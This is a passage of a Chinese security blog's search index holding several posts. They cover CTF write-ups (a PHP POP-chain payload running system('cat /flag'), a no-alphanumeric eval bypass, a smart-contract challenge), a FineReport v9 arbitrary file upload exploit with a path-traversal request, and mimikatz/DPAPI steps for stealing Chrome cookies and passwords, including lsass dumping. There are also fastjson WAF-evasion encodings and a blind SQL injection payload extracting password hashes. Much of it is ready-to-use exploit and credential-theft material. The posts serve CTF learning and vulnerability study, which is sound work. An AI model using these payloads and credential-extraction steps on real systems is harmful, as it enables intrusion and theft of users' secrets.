DNUWgV();$vDBkPwqO-&gt;zXEmp6T=$ZYHhsIid;$mszgihWC-&gt;z35pfqP=$vDBkPwqO;$NVHbgdzD-&gt;KGgGFnb=$mszgihWC;$prvhXPMW-&gt;D6qeYVK=$NVHbgdzD;$BIbCvgZD-&gt;UwQCEH2=$prvhXPMW;$xWVjhwmO-&gt;ST8sCZq=$BIbCvgZD;$YThMXwcb-&gt;pMgtiwK=$xWVjhwmO;$BzceWjKp-&gt;OO72gIu=$YThMXwcb;$PNHChDce-&gt;GYBlHLq=$BzceWjKp;$neJOwgfu-&gt;yWYNYcP=$PNHChDce;$MegPsOnX-&gt;dFy0Irz=$neJOwgfu;$GMwztlCS-&gt;Cs99EPC=$MegPsOnX;$ASyQaYMV-&gt;QidIkAq=$GMwztlCS;$nULgbaKw-&gt;gE4DrP9=$ASyQaYMV;$IatldcbW-&gt;OksedLV=$nULgbaKw;$lcbgRpGI-&gt;SUxaKsh=$IatldcbW;$DLcTtAga-&gt;u3832FP=$lcbgRpGI;$a-&gt;fBuH5Og=$DLcTtAga;//$a = $_GET['pop'];$b = $_GET['argv'];echo serialize($a);//$a = unserialize($a);//var_dump($a);$a-&gt;YYdqkf($b);?&gt; 生成序列化文本?pop=O:6:%22WK4tcG%22:1:{s:7:%22fBuH5Og%22;O:6:%22xaeGnG%22:1:{s:7:%22u3832FP%22;O:6:%22oAMzcx%22:1:{s:7:%22SUxaKsh%22;O:6:%22p38LCI%22:1:{s:7:%22OksedLV%22;O:6:%22GbfW4c%22:1:{s:7:%22gE4DrP9%22;O:6:%22m2s3zO%22:1:{s:7:%22QidIkAq%22;O:6:%22PgSSqR%22:1:{s:7:%22Cs99EPC%22;O:6:%22RLuIRL%22:1:{s:7:%22dFy0Irz%22;O:6:%22WykBAC%22:1:{s:7:%22yWYNYcP%22;O:6:%22g6hgDh%22:1:{s:7:%22GYBlHLq%22;O:6:%22HDaeRV%22:1:{s:7:%22OO72gIu%22;O:6:%22bREm3w%22:1:{s:7:%22pMgtiwK%22;O:6:%22D0aZh5%22:1:{s:7:%22ST8sCZq%22;O:6:%22T9NX4U%22:1:{s:7:%22UwQCEH2%22;O:6:%22eWciOL%22:1:{s:7:%22D6qeYVK%22;O:6:%22TqWDlm%22:1:{s:7:%22KGgGFnb%22;O:6:%22XoFA87%22:1:{s:7:%22z35pfqP%22;O:6:%22MU1ai5%22:1:{s:7:%22zXEmp6T%22;O:6:%22eHtdBF%22:1:{s:7:%22V7XKdgi%22;O:6:%22DNUWgV%22:1:{s:7:%22bieiHE3%22;N;}}}}}}}}}}}}}}}}}}}}&amp;argv=system(%27cat%20/flag%27);//访问即可getflag [强网先锋]寻宝需要两个KEY 来getflag KEY1 &lt;?phpheader('Content-type:text/html;charset=utf-8');highlight_file(__file__);function filter($string){ $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\\$','\\(','\\.','num','html','\\/','\\,','\\'','0000000'); $filter_phrase= '/'.implode('|',$filter_word).'/'; return preg_replace($filter_phrase,'',$string); }if($ppp){ unset($ppp);}$ppp['number1'] = \"1\";$ppp['number2'] = \"1\";$ppp['nunber3'] = \"1\";$ppp['number4'] = '1';$ppp['number5'] = '1';extract($_POST);$num1 = filter($ppp['number1']); $num2 = filter($ppp['number2']); $num3 = filter($ppp['number3']); $num4 = filter($ppp['number4']);$num5 = filter($ppp['number5']); if(isset($num1) &amp;&amp; is_numeric($num1)){ die(\"非数字\");}else{ if($num1 &gt; 1024){ echo \"第一层\"; if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){ echo \"第二层\"; if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){ echo \"第三层\"; if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){ echo \"第四层\"; if(!isset($num5)||(strlen($num5)==0)) die(\"no\"); $b=json_decode(@$num5); if($y = $b === NULL){ if($y === true){ echo \"第五层\"; include 'KeY1lhv.php'; echo $KEY1; } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no111\"); }} number1 number2使用科学计数法number3 md5前缀碰撞number4 带负号的0值绕过number5 json {1}即为true成功拿到KEY1 Key2下载文件压缩包内有大量docx文件编写脚本提取docx正文文本 寻找带有KEY的文本找到KEY2KEY1 KEY2提交到网站 成功getflag","permalink":"https://rce.moe/2021/06/14/QWB-2021-WEB-WP/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2021年春秋杯网络安全联赛春季赛-CTF-GameContract-WriteUp","date":"2021/06/08","text":"今年春秋杯春秋杯出了一道智能合约杂项 从来没接触过ETH合约的CTF题 网上找了一堆文章做出来了这道题 这里详细写出解题过程以便学习ETH智能合约的调用 GameContract题目分析访问题目网站 要求使用ETH钱包地址注册 使用浏览器扩展metamask注册之(这也是为了方便后续对合约函数的调用)准备好 Rinkeby 测试网络的 ETH 用作手续费转入所注册后给的 ETH 地址中 (这是专门去问了下主办方才知道的 网页上没有写是什么测试网络 (ETH比较大的测试网络有4个) 注册后居然还看不到自己的ETH地址)看到如此大的价格波动 肯定是利用价格波动赚差价了到这里还不知道GETFLAG的条件 这是一个ETH合约题 所以我们转向ETH合约去看看合约代码写了什么使用测试网络区块链浏览器查看交易列表 发现了合约地址区块链浏览器自带的反编译工具 反编译合约代码审计源码发现一个疑似getflag的函数 (这里面还有一个坑 getflag函数名没有公开 询问主办方才给了函数名 在最后放出了合约的部分源码)需要使用 10*10^6 个币(1000W)兑换flag 初始有1W币之后就进行股票交易操作来满足题目要求了通过利用股票价格波动进行频繁买卖操作最终得到了1000W币 合约的调用下面是对合约函数的调用操作 (看到排行榜有个大佬几亿个币却不会兑换flag太可惜了)这里用到的工具是http://remix.ethereum.org/这是一个ETH合约开发调试工具 这里用来调用现有的链上合约打开网站右键新建一个文件 命名为*.sol 例如test.sol // SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.7.0 &lt;0.9.0;/** * @title Storage * @dev Store &amp; retrieve value in a variable */contract TEST { function payForFlag() public{ }} 这里只用写出要调用的函数里面不需要写功能 比较像c语言的函数声明 但还有很大的区别 写完一定要ctrl+s保存并编译 function TEST123(uint256 TEST) public view returns (uint256){ } 这个是带传参和返回值的写法写完函数声明点击左侧Deploy &amp; run transactions环境选择 Injected Web3此时metamask扩展会弹出授权窗口 输入密码 授权要操作的ETH账号(这里是股票平台注册时填写的ETH地址所属的钱包账号 )授权成功后会显示钱包地址和ETH余额 (在发起合约交易一定要保证账户有充足的ETH用作手续费)这里不使用本地调试 而是调用链上合约所以只需要在At Address右侧填入合约地址0xec36a74b9d08e796662c032d61530d94061679ea点击At Address按钮 (如果按钮灰色 根据下面的报错提示 请检查合约地址是否正确 上面的步骤是否正确完成)最后一步展开点击操作按钮 在浏览器钱包弹出的窗口授权 即可调用合约通过钱包查看交易地址 在区块链浏览器查看交易状态 Status为Success即为调用成功在注册邮箱收取flag 本文首发于安全客 转载请注明来源","permalink":"https://rce.moe/2021/06/08/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B-CTF-GameContract-WriteUp/","photos":[]},{"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://rce.moe/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"title":"帆软 v9任意文件上传漏洞分析","date":"2021/05/20","text":"前言好久没写博客了 博客源文件找不到了233 假期重新抄了下顺便换了个博客主题经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件 显而易见一堆人不分析就传exp 还说只能覆盖文件 今天又看到一篇一模一样的文章) 分析帆软官方提供了安装包下载地址 下载之https://www.finereport.com/product/download发现这是个java开发的web应用 先准备工具好工具反编译class随手拿个网上给出的playload 看一下路由操作 op svginit,cmd design_save_svg POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1Host: 192.168.10.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDEConnection: closeContent-Type:text/xml;charset=UTF-8Content-Length: 74{\"__CONTENT__\":\"&lt;%out.println(\\\"Hello World!\\\");%&gt;\",\"__CHARSET__\":\"UTF-8\"} 经过搜索 发现存在漏洞的Service在WEB-INF\\lib\\fr-chart-9.0.jar内\\com\\fr\\chart\\web\\ChartSvgInitService.class 反编译之 package com.fr.chart.web;import com.fr.stable.fun.Service;import com.fr.stable.web.RequestCMDReceiver;import com.fr.web.core.WebActionsDispatcher;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class ChartSvgInitService implements Service { private RequestCMDReceiver[] actions = new RequestCMDReceiver[]{new ChartGetSvgAction(), new ChartSaveSvgAction(), new ChartDeleteSvgAction()}; public ChartSvgInitService() { } public String actionOP() { return \"svginit\"; } public void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception { WebActionsDispatcher.dealForActionCMD(var1, var2, var4, this.actions); }} 显然要找的漏洞点在ChartSaveSvgAction内 package com.fr.chart.web;import com.fr.base.Utils;import com.fr.chart.base.MapSvgAttr;import com.fr.chart.base.MapSvgXMLHelper;import com.fr.general.GeneralContext;import com.fr.general.http.HttpClient;import com.fr.stable.StableUtils;import com.fr.web.core.ActionNoSessionCMD;import com.fr.web.utils.WebUtils;import java.io.File;import java.io.FileOutputStream;import java.io.InputStream;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class ChartSaveSvgAction extends ActionNoSessionCMD { public ChartSaveSvgAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = WebUtils.getHTTPRequestParameter(var1, \"filePath\"); String var5 = GeneralContext.getEnvProvider().getPath() + \"/\" + \"assets\" + \"/\"; var4 = var5 + var4.substring(var4.indexOf(\"chartmapsvg\")); File var6 = null; if (var4.contains(\".svg\")) { var6 = new File(var4.substring(0, var4.lastIndexOf(\"/\"))); } else { var6 = new File(var4); } if (!var6.exists()) { var6.mkdirs(); } InputStream var7 = HttpClient.getInputStream(var1); if (var7 != null) { FileOutputStream var8 = new FileOutputStream(var4); Utils.copyBinaryTo(var7, var8); String[] var9 = StableUtils.pathSplit(var4); String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - 1]); MapSvgXMLHelper.getInstance().pushMapAttr(var10, new MapSvgAttr(var4)); var8.flush(); var7.close(); var8.close(); } } public String getCMD() { return \"design_save_svg\"; }} 这个action原本功能应该是上传保存svg图片传入uri中的filePath参数的处理 String var4 = WebUtils.getHTTPRequestParameter(var1, “filePath”); // 首先传入uri中的filePath参数String var5 = GeneralContext.getEnvProvider().getPath() + “/“ + “assets” + “/“; //取当前目录拼接成保存目录var4 = var5 + var4.substring(var4.indexOf(“chartmapsvg”)); //取filePath中的chartmapsvg右侧的字符串与var5目录拼接 var4 即为目标操作 目录/文件路径这里有一个安全问题 输入filePath可控 可以构造目录穿越那么为什么那么多人说这个漏洞只能覆盖文件呢 我们往下看 File var6 = null; //文件系统操作if (var4.contains(“.svg”)) { //判断路径是否包含字符串.svgvar6 = new File(var4.substring(0, var4.lastIndexOf(“/“))); //如果包含 取最后一个/前面的字符串作为路径new一个File类} else {var6 = new File(var4); //如果不包含 直接用路径new一个File类}if (!var6.exists()) { //判断var6文件/文件夹是否存在var6.mkdirs();//不存在则创建文件夹} 这个就是被认为该漏洞只能覆盖文件的原因这处显然是实现文件夹创建的功能而写的下面的代码就是把 _CONTENT_ 写入var6打开的路径中 就不赘述了 第一种利用方法下面最重要的来了假设filePath 传入 chartmapsvg/123.jsp 则var6打开的路径为 当前环境变量目录/assets/123.jsp假设123.jsp不存在 所以会创建一个123.jsp的文件夹123.jsp就变成了一个文件夹了因为123.jsp是文件夹所以不能当做文件打开写入数据 导致利用失败如果123.jsp存在 就不会创建文件夹 直接写入数据 达到文件覆盖的目的这个是网传EXP的利用方法 第二种利用方法其实还有另一种方法仔细阅读代码发现 if (var4.contains(\".svg\")) {var6 = new File(var4.substring(0, var4.lastIndexOf(\"/\"))); 如果传入的路径包含.svg字符串 则判断和创建的将会是父文件夹根据上面的判断条件就可以写出构造路径利用的第二种方法了chartmapsvg/123.svg.jsp 父目录存在直接写入一个123.svg.jsp文件chartmapsvg/.svg/123.jsp .svg目录不存在创建一个.svg文件夹 在文件夹下写入一个123.jsp文件所以说为什么当时没有发现这种简单的方法却搞出个这种奇葩的利用)","permalink":"https://rce.moe/2021/05/20/fanruanupload/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"}],"title":"chrome 浏览器cookies&登陆凭据解密&Windows系统下DPAPI中的MasterKey获取","date":"2021/05/05","text":"谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取谷歌浏览器の加解密Chrome cookies 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies”Chrome 登陆凭据 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” 谷歌浏览器使用了windows自带的DPAPI进行加解密操作 解密方法有两种 第一种方法 :直接以加密数据的用户身份调用DPAPI解密Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotectps:如果没有目标加密文件的用户的权限 或者是想要解密机器上其他用户加密储存的信息这种方法就不能使用了 第二种方法 : 获取MasterKey脱机解密DPAPI加密的数据需要使用MasterKey解密如果可以拿到MasterKey的话就可直接解密数据Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotect /masterkey:36af83d6e6a67e4f67e6f45ca0464a031946182b3e67d72ce9c08e22d7a720b5d2a768418291f28fb79c6def7b068f84955e764e87e36c6b0b666e05fb7eb9f4 拿masterkey的几种方法方法一 直接在目标机器运行Mimikatz提取privilege::debugsekurlsa::dpapi(需目标用户已登陆) 方法二 转储lsass.exe 进程从内存提取masterkey如果目标用户已经登陆 lsass进程的内存中会存在masterkey 转储之 使用Mimikatz提取procdump.exe -accepteula -ma lsass.exe 666.dmpsekurlsa::minidump lsass.dmpsekurlsa::dpapi 方法三 导出SAM注册表 提取user hash 解密masterkey文件需SYSTEM权限reg save HKLM\\SYSTEM SS.hivreg save HKLM\\SECURITY SE.hivm/u 值解密Masterkey文件mimikatz log “lsadump::secrets /system:SS.hiv /security:SE.hiv”拿到DPAPI_SYSTEM m/u 后半部分的值 (HASH)这种方法对应MASTERKEY位置在C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User(一个个文件试总会解密成功的 现在不知道怎么获取用户对应的GUIDmimikatz “dpapi::masterkey /in:C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User{GUID} /system:HASH”即可拿到masterkey 方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件这是当时 volatility内存取证题遇到的问题 这里就随手记录下来了第一步获取用户密码(或hash)找到masterkey文件位置这种方法的文件位置在C:\\Users{username}\\AppData\\Roaming\\Microsoft\\Protect{SID}{GUID}dpapi::masterkey /in:C:\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA /protected/password可以用/hash:密码hash代替(NTLM or SHA1)即可拿到masterkey 方法五 通过域管理员导出backup key 恢复Master key利用条件:目标机器加入域 要拿的是域用户的key 拿到域管理员权限lsadump::backupkeys /system:123.com /export (需要域管理员权限) 导出domain backup keydpapi::masterkey /in:”C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe” /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk即可拿到masterkey 参考 渗透技巧-获取Windows系统下DPAPI中的MasterKey howto-~-scheduled-tasks-credentials Reading DPAPI Encrypted Secrets with Mimikatz and C++ Operational Guidance for Offensive User DPAPI Abuse","permalink":"https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}],"title":"fastjson绕过WAF的TIPS","date":"2021/05/05","text":"fastjson绕WAFのTIPSfastjson对字符串转义处理の特性fast解析字符串支持\\u Unicode转义和 \\x HEX转义的字符串解码 (一般json仅支持Unicode转义 fastjson多了对十六进制转义的支持)例如 字符串 driverClassLoader Unicode转义 编码 \\uxxxx(json通用)\\u0064\\u0072\\u0069\\u0076\\u0065\\u0072\\u0043\\u006C\\u0061\\u0073\\u0073\\u004C\\u006F\\u0061\\u0064\\u0065\\u0072HEX转义编码 \\x** (fastjson only)\\x64\\x72\\x69\\x76\\x65\\x72\\x43\\x6C\\x61\\x73\\x73\\x4C\\x6F\\x61\\x64\\x65\\x72fastjson中两者可以混合使用例:\\x64\\u0072\\x0069\\u0076\\x65\\u0072\\x43\\x6C\\u0061\\u0073\\x73\\x4C\\x006F\\x61\\x64\\x65\\u0072使用CyberChef进行方便的编解码这种方法可以绕过一些字符串规则匹配的waf 除此之外playload也可以加入%08%09这种空白字符扰乱waf对json匹配解析","permalink":"https://rce.moe/2021/05/05/fastjson%E7%BB%95WAF-TIPS/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2020安恒DASCTF八月浪漫七夕战 ezrce Writeup","date":"2020/08/25","text":"早上有点事 差点忘了有比赛233 &lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST['code'];$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','@','\\~','\\^','\\[','\\]','\\&amp;','\\?','\\&lt;','\\&gt;','\\*','1','2','3','4','5','6','7','8','9','0');//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) { if (preg_match ('/' . $blacklisted . '/im', $code)) { die('you are not smart'); }}eval(\"echo($code)\");?&gt; 题目过滤了全部字母和数字和部分位运算符 由http头X-Powered-By: PHP/7.3.21可知 服务器PHP版本为7.3.21 需要构造无字母数字的playload 虽然过滤了部分位运算符 但还是漏了一个| 或运算 利用或运算符构造playload 调用readfile函数 读取根目录flagplayload code=('````````'|'\u0012\u0005\u0001\u0004\u0006 \u0005')('/````'|'/\u0006 \u0001\u0007'));//bas64Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw==","permalink":"https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"记一次mysql盲注遇到的问题","date":"2020/08/15","text":"前几天我把一个CVE写成EXP的时候遇到了一个问题目标使用了直接拼接SQL语句的方法进行sql查询而且使用的是UPDATE方法sql_query(\"UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (\" . implode(\", \", $_POST[conusr]) . \") AND status='pending'\");根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hashconusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#发现执行后报出错误1093 - You can't specify target table 'users' for update in FROM clause这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表MYSQL不允许更新一张表的条件来自于查询这张表解决方法:在外面再套一层selectUPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#","permalink":"https://rce.moe/2020/08/15/%E8%AE%B0%E4%B8%80%E6%AC%A1mysql%E7%9B%B2%E6%B3%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"GeekPwn 2020 云上挑战赛 cosplay! writeup","date":"2020/07/14","text":"学生党 业余挖洞 只会点web 第一次写writeup，不大会写，请多关照。 看到这个题目cosplay! 就先看了眼这道题 居然拿到了个一血 0.0尝试上传文件发现是通过COS(腾讯的对象云储存)上传文件var Bucket = ‘933kpwn-1253882285’;var Region = ‘ap-shanghai’; var cos = new COS({ getAuthorization: function (options, callback) { var url = '/GetTempKey?path=/upload'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.onload = function (e) { try { var data = JSON.parse(e.target.responseText); var credentials = data.Credentials; } catch (e) { } if (!data || !credentials) return console.error('credentials invalid'); callback({ TmpSecretId: credentials.TmpSecretId, TmpSecretKey: credentials.TmpSecretKey, XCosSecurityToken: credentials.Token, ExpiredTime: data.ExpiredTime, }); }; xhr.send(); }}); 分析源码发现这个页面是在本地利用从服务器获取的临时密钥给上传参数签名的一般上传用的普通密钥 而且是在后端给请求做签名但是临时密钥如果存在权限控制不当(临时密钥生成的时候可以限制操作方法和范围) 也可以在密钥有效期内完全控制储存桶(这道题就是这种情况) 访问 /GetTempKey?path=/ 取得临时密钥和令牌(临时密钥生成的时候可以限制操作路径)根据腾讯COS的文档 使用临时密钥和令牌访问储存桶为了方便这里使用腾讯云官方提供的PHP SDK 来操作储存桶临时密钥没有操作限制 成功获取储存桶内所有的对象键列表发现 Flag键名为 f1L9@/flag.txt 读取f1L9@/flag.txt 拿到 flag","permalink":"https://rce.moe/2020/07/14/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-witeup/","photos":[]},{"tags":[],"title":"Hello World","date":"2020/04/12","text":"第一个博客最近试试开始写点博客","permalink":"https://rce.moe/2020/04/12/hello-world/","photos":[]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"},{"name":"WAF","slug":"WAF","permalink":"https://rce.moe/tags/WAF/"},{"name":"bypass","slug":"bypass","permalink":"https://rce.moe/tags/bypass/"},{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"CVE","slug":"CVE","permalink":"https://rce.moe/tags/CVE/"},{"name":"writeup","slug":"writeup","permalink":"https://rce.moe/tags/writeup/"},{"name":"WEB","slug":"WEB","permalink":"https://rce.moe/tags/WEB/"},{"name":"goahead","slug":"goahead","permalink":"https://rce.moe/tags/goahead/"},{"name":"password","slug":"password","permalink":"https://rce.moe/tags/password/"},{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://rce.moe/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}]}